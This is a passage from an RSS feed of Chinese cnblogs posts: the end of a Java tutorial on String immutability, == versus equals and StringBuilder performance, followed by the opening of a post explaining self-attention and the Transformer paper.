&lt;p&gt;&lt;strong&gt;transient&lt;/strong&gt;:被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。&lt;br/&gt;&lt;strong&gt;native&lt;/strong&gt;: 被native修饰的方法实际是由另一种语言进行实现的本地方法。例如Java中获取的Long类型的时间戳 ：&lt;code&gt;System.currentTimeMillis();&lt;/code&gt; 实际是由native 修饰的，&lt;br/&gt;源码为:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; public static native long currentTimeMillis();&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;string&quot;&gt;String&lt;/h2&gt;
&lt;p&gt;String 类型可能就是我们最常用的的对象了。&lt;br/&gt;首先说明，String并不是基本数据类型，而是一个对象，并且是不可变的对象。查看源码可以String类是被final修饰的，是不可被继承的！&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;String的在未被初始化的时候为null，表示它还没有被创建，自然也就没有分配空间;&lt;br/&gt;而&quot; &quot;和 new String()不是null，它们是已经被创建，只是值为空而已！并且也分配了内存空间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;String有15种构造方法,有两种是过时的，其中包含char[],byte[],int[],String,StringBuffer,StringBuilder。&lt;br/&gt;我们在创建String对象的的时候，一般是使用 String str=&quot;xxx&quot;，但有时也会用new String()来初始话字符串。&lt;br/&gt;例如:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;    String hello=&quot;hello&quot;;
    String newHello=new String(&quot;hello&quot;);
    char []cHello ={'h','e','l','l','o'};
    String str=new String(cHello);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意:String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;string常用方法&quot;&gt;String常用方法&lt;/h3&gt;
&lt;p&gt;大概讲述了String的用法之后，这里我们来列举一些String常用的方法。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;1.length ：返回此字符串的长度。&lt;br/&gt;2.charAt：返回指定索引处的 char 值。&lt;br/&gt;3.compareTo:把这个字符串和另一个对象比较。&lt;br/&gt;4.concat：将指定字符串连接到此字符串的结尾。&lt;br/&gt;5.split:根据给定正则表达式的匹配拆分此字符串。&lt;br/&gt;6.equals:将此字符串与指定的对象比较。&lt;br/&gt;7.endsWith:测试此字符串是否以指定的后缀结束。&lt;br/&gt;8.startsWith:测试此字符串是否以指定的前缀结束。&lt;br/&gt;9.getBytes: 使用平台的默认字符集将此 String 编码为 byte 序列，并将结果存储到一个新的 byte 数组中。&lt;br/&gt;10.indexOf:返回指定字符在此字符串中第一次出现处的索引。&lt;br/&gt;11.replace：返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。 12:substring：返回一个新的字符串，它是此字符串的一个子字符串。&lt;br/&gt;...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;更多可以参考Api文档。&lt;/p&gt;
&lt;h3 id=&quot;string对象比较&quot;&gt;String对象比较&lt;/h3&gt;
&lt;p&gt;String作为我们最常用的对象，在面试中估计也会接触不少。一般来说，会考到String的常量池相关问题，主要是使用String进行比较的时候，==和equals这两种方法来判断是否相当。这里收集了一些String经常遇到的问题。&lt;br/&gt;代码如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  
            String s1 = &quot;test&quot;;
            String s2 = new String(&quot;test&quot;);
            String s3 = &quot;te&quot;;
            String s4 = &quot;st&quot;;
            String s5 = &quot;te&quot; + &quot;st&quot;;
            String s6 = s3 + s4;
            String s7 = new String(s1);
            System.out.println(s1 == s2); 
            System.out.println(s1 == s5); 
            System.out.println(s1 == s6); 
            System.out.println(s7==s1);       
            System.out.println(s7.equals(s1)); 
        &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;false
true
false
false
true&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果有经验的话，大概可以一眼看出结果。但是如果经验不足的话，往往会吃这个亏。这里来解释下为什么会出现这种结果。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;1.虽然看起来是一样的，但是新建一个String类的时候会重新分配引用地址，而 == 就是比较引用地址，所以为false。&lt;br/&gt;2.在编译之前就可以确认s5=test， 并且引用地址一样，所以为true;&lt;br/&gt;3.字符串常量池的原则 这时 s6 的值是在运行时得到的，它会重新构造字符串对象 所以为false。&lt;br/&gt;4.和第一个一样的，就是换汤不换药，所以为false。&lt;br/&gt;5.equals 只比较值相等，不关心它的引用地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看完上面的例子之后，再来看看下面的这个&lt;br/&gt;代码示例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; String ab=&quot;ab&quot;;
 String c=&quot;c&quot;;
 String ab_c=ab+c;
 String ab_c1=&quot;ab&quot;+&quot;c&quot;;
 String abc=&quot;abc&quot;;
 System.out.println(ab_c == abc + &quot; : &quot; + ab_c.equals(abc));

 System.out.println((ab_c == abc) + &quot; : &quot; + ab_c.equals(abc));

 System.out.println((ab_c1 == abc) + &quot; : &quot; + ab_c1.equals(abc));
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果:&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;false&lt;br/&gt;false : true&lt;br/&gt;true : true&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;到这里，可能就会诧异了，为什么和我想的不一样呢？&lt;br/&gt;这里其实是有陷阱的，也就是运算符的优先级。&lt;br/&gt;第一个结果就是优先级的问题导致的，它会先计算 &lt;code&gt;abc + &quot; : &quot; + ab_c.equals(abc)&lt;/code&gt; ，然后再来进行比较，所以为false。同理，下面的也是如此，基本和上面的那个例子差不多，这里就不再概述了。&lt;/p&gt;
&lt;h3 id=&quot;stringstringbuffer和stringbuilder&quot;&gt;String、StringBuffer和StringBuilder&lt;/h3&gt;
&lt;p&gt;String、StringBuffer和StringBuilder的区别:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;String: String的特点是一旦赋值，便不能更改其指向的字符对象，如果更改，则会指向一个新的字符对象。&lt;/li&gt;
&lt;li&gt;StringBuffer:StringBuffer对象可以调用其方法动态的进行增加、插入、修改和删 除操作，且不用像数组那样事先指定大小，从而实现多次插入字 符，一次整体取出的效果，因而操作字符串非常灵活方便。并且生成数据之后可以toString转为String，线程安全。&lt;/li&gt;
&lt;li&gt;StringBuilder：它是在单线程环境下使用的，因为它的所有方面都没有被synchronized修饰，因此它的效率也比StringBuffer要高。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;关于字符串拼接方式，在String类中，我们最常用的是 + ,其次是使用StringBuffer或StringBuilder 的append方法，至于String类中的concat几乎很少用到。&lt;br/&gt;一般来说，如果在少量的字符串进行拼接的话，我们会使用+，如果拼接过多的话，单线程使用 StringBuilder ，多线程使用StringBuffer 进行拼接。因为使用String 的 + 在过多的字符串进行拼接的时候会极大的使用内存，因为它在凭借的时候还是使用 append()方法，然后再进行toString转换，如果是少量的时候，是感觉不到差异的，但是在大量拼接的时候就会明显感受得到。&lt;/p&gt;
&lt;p&gt;代码示例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;String str=&quot;Hello World&quot;;
String str1=&quot;&quot;;
StringBuffer sbr=new StringBuffer(str); 
StringBuilder sbd=new StringBuilder(str); 
long start=System.currentTimeMillis();
   for(int i=0;i&amp;lt;10000;i++){
     str1+=str;
   }
   System.out.println(&quot;String累加用时:&quot;+(System.currentTimeMillis()-start)+&quot;ms&quot;);
   long start2=System.currentTimeMillis();
   for(int i=0;i&amp;lt;10000;i++){
     sbr.append(str);
   }
   System.out.println(&quot;StringBuffer累加用时:&quot;+(System.currentTimeMillis()-start2)+&quot;ms&quot;);
   long start3=System.currentTimeMillis();
   for(int i=0;i&amp;lt;10000;i++){
     sbd.append(str);
   }
   System.out.println(&quot;StringBuilder累加用时:&quot;+(System.currentTimeMillis()-start3)+&quot;ms&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;String累加用时:701ms
StringBuffer累加用时:2ms
StringBuilder累加用时:0ms&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里从输出结果中可以看到String 的+拼接方法的耗时了。但是使用 + 实在是方便。所以在这里建议如果字符串拼接次数在10一下，可以使用+，过多的则用StringBuffer或StringBuilder。&lt;/p&gt;
&lt;h2 id=&quot;其它&quot;&gt;其它&lt;/h2&gt;
&lt;p&gt;参考:&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/qiumengchen12/article/details/44939929&quot; class=&quot;uri&quot;&gt;https://blog.csdn.net/qiumengchen12/article/details/44939929&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/chenssy/article/details/13004291&quot; class=&quot;uri&quot;&gt;https://blog.csdn.net/chenssy/article/details/13004291&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;到此，本文就结束了，谢谢阅读！欢迎留言和点赞，你的支持是我写作最大的动力！&lt;br/&gt;版权声明:&lt;br/&gt;作者：虚无境&lt;br/&gt;博客园出处：&lt;a href=&quot;http://www.cnblogs.com/xuwujing&quot; class=&quot;uri&quot;&gt;http://www.cnblogs.com/xuwujing&lt;/a&gt;&lt;br/&gt;CSDN出处：&lt;a href=&quot;http://blog.csdn.net/qazwsxpcm&quot; class=&quot;uri&quot;&gt;http://blog.csdn.net/qazwsxpcm&lt;/a&gt;　　　　&lt;br/&gt;个人博客出处：&lt;a href=&quot;http://www.panchengming.com&quot; class=&quot;uri&quot;&gt;http://www.panchengming.com&lt;/a&gt;&lt;br/&gt;原创不易，转载请标明出处，谢谢！&lt;/p&gt;
</description>
<pubDate>Sat, 24 Mar 2018 03:57:00 +0000</pubDate>
<dc:creator>虚无境</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xuwujing/p/8638329.html</dc:identifier>
</item>
<item>
<title>自然语言处理中的自注意力机制（Self-attention Mechanism） - robert_ai</title>
<link>http://www.cnblogs.com/robert-dlut/p/8638283.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/robert-dlut/p/8638283.html</guid>
<description>&lt;p&gt;&lt;span&gt;自然语言处理中的自注意力机制（Self-attention Mechanism）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;近年来，注意力（&lt;/span&gt;&lt;span&gt;Attention&lt;/span&gt;&lt;span&gt;）机制被广泛应用到基于深度学习的自然语言处理&lt;/span&gt;&lt;span&gt;(NLP)&lt;/span&gt;&lt;span&gt;各个任务中，之前我对早期注意力机制进行过一些学习总结（可见&lt;/span&gt;&lt;span&gt;http://www.cnblogs.com/robert-dlut/p/5952032.html&lt;/span&gt;&lt;span&gt;）。随着注意力机制的深入研究，各式各样的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;被研究者们提出。在&lt;/span&gt;&lt;span&gt;2017&lt;/span&gt;&lt;span&gt;年&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;月&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;机器翻译团队在&lt;/span&gt;&lt;span&gt;arXiv&lt;/span&gt;&lt;span&gt;上放出的《&lt;/span&gt;&lt;span&gt;Attention is all you need&lt;/span&gt;&lt;span&gt;》论文受到了大家广泛关注，自注意力（&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;）机制开始成为神经网络&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的研究热点，在各个任务上也取得了不错的效果。本人就这篇论文中的&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;以及一些相关工作进行了学习总结（其中也参考借鉴了张俊林博士的博客&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;深度学习中的注意力机制&lt;/span&gt;&lt;span&gt;(2017&lt;/span&gt;&lt;span&gt;版&lt;/span&gt;&lt;span&gt;)&quot;&lt;/span&gt;&lt;span&gt;和苏剑林的&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;《&lt;/span&gt;&lt;span&gt;Attention is All You Need&lt;/span&gt;&lt;span&gt;》浅读（简介&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;代码）&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;），和大家一起分享。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;Attention&lt;/span&gt;&lt;span&gt;机制最早是在视觉图像领域提出来的，应该是在九几年思想就提出来了，但是真正火起来应该算是&lt;/span&gt;&lt;span&gt;2014&lt;/span&gt;&lt;span&gt;年&lt;/span&gt;&lt;span&gt;google mind&lt;/span&gt;&lt;span&gt;团队的这篇论文《&lt;/span&gt;&lt;span&gt;Recurrent Models of Visual Attention&lt;/span&gt;&lt;span&gt;》，他们在&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;模型上使用了&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;机制来进行图像分类。随后，&lt;/span&gt;&lt;span&gt;Bahdanau&lt;/span&gt;&lt;span&gt;等人在论文《&lt;/span&gt;&lt;span&gt;Neural Machine Translation by Jointly Learning to Align and Translate&lt;/span&gt;&lt;span&gt;》中，使用类似&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的机制在机器翻译任务上将翻译和对齐同时进行，他们的工作算是第一个将&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;机制应用到&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;领域中。接着&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;机制被广泛应用在基于&lt;/span&gt;&lt;span&gt;RNN/CNN&lt;/span&gt;&lt;span&gt;等神经网络模型的各种&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;任务中。&lt;/span&gt;&lt;span&gt;2017&lt;/span&gt;&lt;span&gt;年，&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;机器翻译团队发表的《&lt;/span&gt;&lt;span&gt;Attention is all you need&lt;/span&gt;&lt;span&gt;》中大量使用了自注意力（&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;）机制来学习文本表示。自注意力机制也成为了大家近期的研究热点，并在各种&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;任务上进行探索。下图维&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;研究进展的大概趋势。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114521382-1901693540.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;Attention&lt;/span&gt;&lt;span&gt;机制的本质来自于人类视觉注意力机制。人们视觉在感知东西的时候一般不会是一个场景从到头看到尾每次全部都看，而往往是根据需求观察注意特定的一部分。而且当人们发现一个场景经常在某部分出现自己想观察的东西时，人们会进行学习在将来再出现类似场景时把注意力放到该部分上。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114521745-677162806.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;下面我先介绍一下在&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;中常用&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的计算方法（里面借鉴了张俊林博士&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;深度学习中的注意力机制&lt;/span&gt;&lt;span&gt;(2017&lt;/span&gt;&lt;span&gt;版&lt;/span&gt;&lt;span&gt;)&quot;&lt;/span&gt;&lt;span&gt;里的一些图）。&lt;/span&gt;&lt;span&gt;Attention&lt;/span&gt;&lt;span&gt;函数的本质可以被描述为一个查询（&lt;/span&gt;&lt;span&gt;query&lt;/span&gt;&lt;span&gt;）到一系列（键&lt;/span&gt;&lt;span&gt;key-&lt;/span&gt;&lt;span&gt;值&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;）对的映射，如下图。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114522044-1766547113.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;在计算&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;时主要分为三步，第一步是将&lt;/span&gt;&lt;span&gt;query&lt;/span&gt;&lt;span&gt;和每个&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;span&gt;进行相似度计算得到权重，常用的相似度函数有点积，拼接，感知机等；然后第二步一般是使用一个&lt;/span&gt;&lt;span&gt;softmax&lt;/span&gt;&lt;span&gt;函数对这些权重进行归一化；最后将权重和相应的键值&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;进行加权求和得到最后的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;。目前在&lt;/span&gt;&lt;span&gt;NLP&lt;/span&gt;&lt;span&gt;研究中，&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;常常都是同一个，即&lt;/span&gt;&lt;span&gt;key=value&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114522327-1231729326.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;接下来我将介绍《&lt;/span&gt;&lt;span&gt;Attention is all you need&lt;/span&gt;&lt;span&gt;》这篇论文。这篇论文是&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;机器翻译团队在&lt;/span&gt;&lt;span&gt;2017&lt;/span&gt;&lt;span&gt;年&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;&lt;span&gt;月放在&lt;/span&gt;&lt;span&gt;arXiv&lt;/span&gt;&lt;span&gt;上，最后发表在&lt;/span&gt;&lt;span&gt;2017&lt;/span&gt;&lt;span&gt;年&lt;/span&gt;&lt;span&gt;nips&lt;/span&gt;&lt;span&gt;上，到目前为止&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;学术显示引用量为&lt;/span&gt;&lt;span&gt;119&lt;/span&gt;&lt;span&gt;，可见也是受到了大家广泛关注和应用。这篇论文主要亮点在于&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）不同于以往主流机器翻译使用基于&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;seq2seq&lt;/span&gt;&lt;span&gt;模型框架，该论文用&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;机制代替了&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;搭建了整个模型框架。&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）提出了多头注意力（&lt;/span&gt;&lt;span&gt;Multi-headed attention&lt;/span&gt;&lt;span&gt;）机制方法，在编码器和解码器中大量的使用了多头自注意力机制（&lt;/span&gt;&lt;span&gt;Multi-headed self-attention&lt;/span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）在&lt;/span&gt;&lt;span&gt;WMT2014&lt;/span&gt;&lt;span&gt;语料中的英德和英法任务上取得了先进结果，并且训练速度比主流模型更快。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;该论文模型的整体结构如下图，还是由编码器和解码器组成，在编码器的一个网络块中，由一个多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;子层和一个前馈神经网络子层组成，整个编码器栈式搭建了&lt;/span&gt;&lt;span&gt;N&lt;/span&gt;&lt;span&gt;个块。类似于编码器，只是解码器的一个网络块中多了一个多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;层。为了更好的优化深度网络，整个网络使用了残差连接和对层进行了规范化（&lt;/span&gt;&lt;span&gt;Add&amp;amp;Norm&lt;/span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114522682-1201536727.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;下面我们重点关注一下这篇论文中的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;。在介绍多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;之前，我们先看一下论文中提到的放缩点积&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;（&lt;/span&gt;&lt;span&gt;scaled dot-Product attention&lt;/span&gt;&lt;span&gt;）。对比我在前面背景知识里提到的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的一般形式，其实&lt;/span&gt;&lt;span&gt;scaled dot-Product attention&lt;/span&gt;&lt;span&gt;就是我们常用的使用点积进行相似度计算的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;，只是多除了一个（为&lt;/span&gt;&lt;span&gt;&lt;em&gt;K&lt;/em&gt;&lt;/span&gt;&lt;span&gt;的维度）&lt;span&gt;&lt;span&gt;起到调节作用，使得内积不至于太大&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114522943-718880007.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;（&lt;/span&gt;&lt;span&gt;Multi-head attention&lt;/span&gt;&lt;span&gt;）结构如下图，&lt;/span&gt;&lt;span&gt;Query&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Key&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Value&lt;/span&gt;&lt;span&gt;首先进过一个线性变换，然后输入到放缩点积&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;，注意这里要做&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;次，其实也就是所谓的多头，每一次算一个头。而且每次&lt;/span&gt;&lt;span&gt;Q&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;K&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;V&lt;/span&gt;&lt;span&gt;进行线性变换的参数&lt;/span&gt;&lt;span&gt;W&lt;/span&gt;&lt;span&gt;是不一样的。然后将&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;次的放缩点积&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;结果进行拼接，再进行一次线性变换得到的值作为多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的结果。可以看到，&lt;/span&gt;&lt;span&gt;google&lt;/span&gt;&lt;span&gt;提出来的多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的不同之处在于进行了&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;次计算而不仅仅算一次，论文中说到这样的好处是可以允许模型在不同的表示子空间里学习到相关的信息，后面还会根据&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;可视化来验证。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114523172-204080606.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;那么在整个模型中，是如何使用&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的呢？如下图，首先在编码器到解码器的地方使用了多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;进行连接，&lt;/span&gt;&lt;span&gt;K&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;V&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Q&lt;/span&gt;&lt;span&gt;分别是编码器的层输出（这里&lt;/span&gt;&lt;span&gt;K=V&lt;/span&gt;&lt;span&gt;）和解码器中都头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;的输入。其实就和主流的机器翻译模型中的&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;一样，利用解码器和编码器&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;来进行翻译对齐。然后在编码器和解码器中都使用了多头自注意力&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;来学习文本的表示。&lt;/span&gt;&lt;span&gt;Self-attention&lt;/span&gt;&lt;span&gt;即&lt;/span&gt;&lt;span&gt;K=V=Q&lt;/span&gt;&lt;span&gt;，例如输入一个句子，那么里面的每个词都要和该句子中的所有词进行&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;计算。目的是学习句子内部的词依赖关系，捕获句子的内部结构。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114523429-793003247.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;对于使用自注意力机制的原因，论文中提到主要从三个方面考虑（每一层的复杂度，是否可以并行，长距离依赖学习），并给出了和&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;CNN&lt;/span&gt;&lt;span&gt;计算复杂度的比较。可以看到，如果输入序列&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;小于表示维度&lt;/span&gt;&lt;span&gt;d&lt;/span&gt;&lt;span&gt;的话，每一层的时间复杂度&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;是比较有优势的。当&lt;/span&gt;&lt;span&gt;n&lt;/span&gt;&lt;span&gt;比较大时，作者也给出了一种解决方案&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;（&lt;/span&gt;&lt;span&gt;restricted&lt;/span&gt;&lt;span&gt;）即每个词不是和所有词计算&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;，而是只与限制的&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;个词去计算&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;。在并行方面，多头&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;CNN&lt;/span&gt;&lt;span&gt;一样不依赖于前一时刻的计算，可以很好的并行，优于&lt;/span&gt;&lt;span&gt;RNN&lt;/span&gt;&lt;span&gt;。在长距离依赖上，由于&lt;/span&gt;&lt;span&gt;self-attention&lt;/span&gt;&lt;span&gt;是每个词和所有词都要计算&lt;/span&gt;&lt;span&gt;attention&lt;/span&gt;&lt;span&gt;，所以不管他们中间有多长距离，最大的路径长度也都只是&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;。可以捕获长距离依赖关系。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114523707-162107568.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;最后我们看一下实验结果，在&lt;/span&gt;&lt;span&gt;WMT2014&lt;/span&gt;&lt;span&gt;的英德和英法机器翻译任务上，都取得了先进的结果，且训练速度优于其他模型。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/670089/201803/670089-20180324114524626-1680739515.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
